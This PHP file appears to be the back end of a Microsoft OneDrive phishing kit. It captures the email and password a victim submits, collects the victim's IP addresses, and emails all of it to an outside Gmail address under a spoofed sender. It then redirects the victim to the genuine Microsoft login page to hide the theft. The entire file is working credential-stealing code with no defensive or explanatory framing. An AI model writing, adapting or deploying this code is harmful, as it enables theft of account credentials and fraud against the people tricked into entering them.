<?php
$email=$_POST["email"];
$password=$_POST["password"];

function get_client_ip_env() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}


// Function to get the client ip address
function get_client_ip_server() {
    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if($_SERVER['HTTP_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}

// Get the client ip address
$ip3 = $_SERVER['REMOTE_ADDR'];


$ip1=get_client_ip_env();
$ip2=get_client_ip_server();

 $to = "williamrichard787@gmail.com";
 $subject = "OneDrive - Mail";
 
 $message = "<!DOCTYPE html>
 <html>
     <head>
 <style>
 table, th, td {
     border: 1px solid black;
     border-collapse: collapse;
 }
 th, td {
     padding: 5px;
     text-align: left;
 }
 </style>
 </head>
     <body>
         <table style='width:50%'>
   <caption>MAIL</caption>
   <tr>
     <th>HEADERS</th>
     <th>VALUE DETAILS</th>
   </tr>";
 $message .= "<tr>
 <td>E-MAIL</td>
 <td>$email</td>
</tr>";
 $message .= "<tr>
 <td>PASSWORD</td>
 <td>$password</td>
</tr>";
 $message .= "<tr>
 <td>IP 1</td>
 <td>$ip1</td>
</tr>";
 $message .= "<tr>
 <td>IP 2</td>
 <td>$ip2</td>
</tr>";
 $message .= "<tr>
 <td>IP 3</td>
 <td>$ip3</td>
</tr>
</table>


 </body>
</html>";
 
 $header = "From:support@citaforex.com \r\n";
 $header .= "Cc:support@citaforex.com \r\n";
 $header .= "MIME-Version: 1.0\r\n";
 $header .= "Content-type: text/html\r\n";
 
 $retval = mail ($to,$subject,$message,$header);
 
 if( $retval == true ) {
    echo "";
 }else {
    echo "Invalid, please try again";
 }
header("LOCATION:https://login.microsoftonline.com/common/oauth2");
?>
